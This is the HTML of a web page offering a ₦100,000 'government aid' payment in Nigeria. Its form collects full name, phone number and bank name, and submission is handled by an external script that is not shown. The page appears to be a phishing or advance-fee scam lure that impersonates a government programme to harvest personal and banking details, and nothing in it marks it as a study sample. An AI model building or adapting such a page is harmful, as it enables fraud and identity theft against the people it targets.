<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Government Aid</title>
<link rel="stylesheet" href="/css/GOVER.css">

<!-- Icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
</head>

<body>

<div class="container">

    <img src="/assets/img/ARM.jpg"
    class="logo">

    <h1>REGISTER FOR ₦100,000 <br> GOVERNMENT AID</h1>

    <p class="subtitle">
        Fill out your details now to see if you qualify to receive financial aid from the Nigerian government.
    </p>

<div class="form-box">

    <div class="input-group">
        <i class="fa fa-user"></i>
        <input type="text" placeholder="Full Name">
    </div>

    <div class="input-group">
        <i class="fa fa-phone"></i>
        <input type="text" placeholder="+234 Phone Number">
    </div>

    <div class="input-group">
        <i class="fa fa-bank"></i>
        <input type="text" placeholder="Bank Name">
    </div>

    <div class="amount">
        Aid Amount: <b>₦100,000 Naira</b>
    </div>

    <button onclick="apply()">APPLY NOW</button>

</div>

</div>

<script src="/js/GOVER.js"></script>
</body>
</html>
